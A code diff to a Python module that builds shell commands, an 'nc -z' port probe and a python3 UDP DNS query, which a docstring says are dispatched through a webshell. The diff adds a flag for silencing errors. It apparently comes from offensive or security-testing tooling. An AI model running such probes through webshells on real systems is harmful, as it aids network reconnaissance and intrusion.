@@ -183,7 +183,13 @@ def nc_probe_command(host: str, port: int, *, timeout: float = 5.0) -> str:
     return f"nc -z -w {t} {shlex.quote(host)} {int(port)} 2>/dev/null || true"
 
 
-def dns_query_command(resolver: str, fqdn: str, *, timeout: float = 0.05) -> str:
+def dns_query_command(
+    resolver: str,
+    fqdn: str,
+    *,
+    timeout: float = 0.05,
+    suppress_errors: bool = True,
+) -> str:
     """UDP/53 DNS query via python3 stdlib."""
     t = max(1, int(max(timeout, 1.0)))
     script = (
@@ -198,12 +204,26 @@ def dns_query_command(resolver: str, fqdn: str, *, timeout: float = 0.05) -> str
         f"s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout({t});"
         "s.sendto(pkt,(resolver,port));s.close()"
     )
-    return f"python3 -c {shlex.quote(script)} 2>/dev/null || true"
+    command = f"python3 -c {shlex.quote(script)}"
+    if suppress_errors:
+        return f"{command} 2>/dev/null || true"
+    return command
 
 
-def dns_query_command_evidence(resolver: str, fqdn: str, *, timeout: float = 0.05) -> dict[str, str]:
+def dns_query_command_evidence(
+    resolver: str,
+    fqdn: str,
+    *,
+    timeout: float = 0.05,
+    suppress_errors: bool = True,
+) -> dict[str, str]:
     """Metadata describing the DNS query command dispatched through the webshell."""
-    command = dns_query_command(resolver, fqdn, timeout=timeout)
+    command = dns_query_command(
+        resolver,
+        fqdn,
+        timeout=timeout,
+        suppress_errors=suppress_errors,
+    )
     return {
         "dns_query_method": DNS_QUERY_METHOD,
         "remote_command": command,
